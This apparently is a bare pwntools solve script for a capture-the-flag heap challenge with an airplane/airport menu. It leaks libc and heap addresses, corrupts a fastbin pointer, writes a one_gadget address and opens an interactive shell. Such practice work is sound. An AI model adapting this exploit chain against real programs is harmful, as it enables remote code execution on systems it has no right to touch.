import pwn 
from pwn import * 

context.binary = "chall_patched"
context.log_level = 'DEBUG'

p = process("./chall_patched")
libc = ELF("./libc-2.23.so")

def buyplane(index,name):
 p.recvuntil(b"do?")
 p.sendline(b"1")
 p.sendlineafter(b"choice: ",index)
 p.sendlineafter(b"name: ",name)
 
def buildairport(size,name):
 p.recvuntil(b"do?")
 p.sendline(b"2")
 p.sendlineafter(b"name? ",size)
 p.sendlineafter(b"name: ",name)

def enterairport(name,lst):
 p.recvuntil(b"do?")
 p.sendline(b"3")
 p.sendlineafter(b"choose?",name)
 p.sendlineafter(b"do ?",lst)
 p.sendline(b"3")
 
def exit():
 p.sendline(b"3")
   
def sellairport(name,sell):
 p.sendlineafter(b"do?",b"3")
 p.sendlineafter(b"choose?",name)
 p.sendlineafter(b"do ?",sell)
 #p.sendlineafter(b"Success!",b"3")
 
def selectplane(name,airport):
 p.recvuntil(b"do?")
 p.sendline(b"4")
 p.sendlineafter(b"choose? ",name)
 p.sendlineafter(b"do ?",b"1")
 p.sendlineafter(b"fly? ",airport)
 p.sendlineafter(b"do ?",b"3")


def sellplane(name):
 p.recvuntil(b"do?")
 p.sendline(b"4")
 p.sendlineafter(b"choose? ",name)
 p.sendline(b"2")
 
airplane_pointer = 0x202020
airport_pointer = 0x202080
  
buildairport(b"128",b"A1")
buildairport(b"128",b"A2")
buildairport(b"128",b"A3")
#pwn.gdb.attach(p,'''
#brva *E08
#''')

sellairport(b"0",b"2")
sellairport(b"1",b"2")
#exit()
buyplane(b"14",b"P1")
selectplane(b"P1",b"2")
enterairport(b"2",b"1")
p.recvuntil(b"Build by ")


leak = u64(p.recvline().strip().ljust(8,b"\x00"))
print(hex(leak))
libc_base = leak - 0x3c3bf8
print(hex(libc_base))
one = libc_base + 0x4526a


buyplane(b"15",b"P2")
selectplane(b"P2",b"2")
enterairport(b"2",b"1")
p.recvuntil(b"Build by ")
p.recvuntil(b"Build by ")
#pwn.gdb.attach(p,'''
#brva *BED
#''')
heap_leak = u64(p.recv(6).ljust(8,b"\x00")) - 0x2e0
print(hex(heap_leak))
target = heap_leak+0x170

sellplane(b"P1")
sellplane(b"P2")
sellairport(b"2",b"2")
buyplane(b"4",p64(target-0x23))
buyplane(b"4",b"P3")
buyplane(b"4",b"P4")
#pwn.gdb.attach(p,'''
#brva *B20
#''')

payload = b"L"*3
payload += p64(heap_leak+0x10)
payload += p64(0x0)
payload += p64(one)
buildairport(b"72",payload)
sellplane(b"P4")

p.interactive()
